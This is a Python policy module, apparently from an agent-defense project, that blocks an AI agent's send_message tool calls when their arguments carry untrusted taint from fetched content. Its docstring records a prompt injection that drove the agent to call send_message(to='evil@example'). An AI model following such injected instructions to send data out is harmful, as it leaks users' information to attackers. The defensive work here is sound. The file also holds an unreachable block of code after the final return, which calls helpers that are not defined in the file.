from immunis.contracts.models import TaintTag, Trust

POLICY_VERSION = 1

def quarantine_required(tag: TaintTag) -> bool:
    return tag.trust == Trust.untrusted


# --- Antibody: block untrusted-content-driven exfiltration ---
ANTIBODY_ID_EXFIL = "ab-block-exfil-untrusted-body"

BLOCKED_EXFIL_REASON = (
    "exfiltration: outbound send_message arguments carry untrusted taint "
    "(fetched_content origin) - attacker-influenced destination or body"
)


def evaluate_tool_call(call):
    """Return (permitted: bool, blocked_by: str|None, reason: str|None).

    First antibody: any send_message whose arguments carry untrusted taint
    is blocked. Evidence: baseline run 211d707..5674894 - injection drove
    send_message(to='evil@example') with permitted=True.
    """
    from immunis.contracts.models import Trust

    if getattr(call, "name", None) != "send_message":
        return True, None, None

    taint_trace = getattr(call, "taint_trace", None) or {}
    for t in taint_trace.values():
        if t.trust == Trust.untrusted:
            return False, ANTIBODY_ID_EXFIL, BLOCKED_EXFIL_REASON

    return True, None, None

    per_arg = _arg_taint(call)
    tags = list(per_arg.values()) if per_arg else [_call_taint(call)]
    tags = [t for t in tags if t is not None]

    for t in tags:
        trust = getattr(t, "trust", t)  # tolerate raw enums
        if trust == Trust.untrusted:
            return False, ANTIBODY_ID_EXFIL, BLOCKED_EXFIL_REASON

    return True, None, None
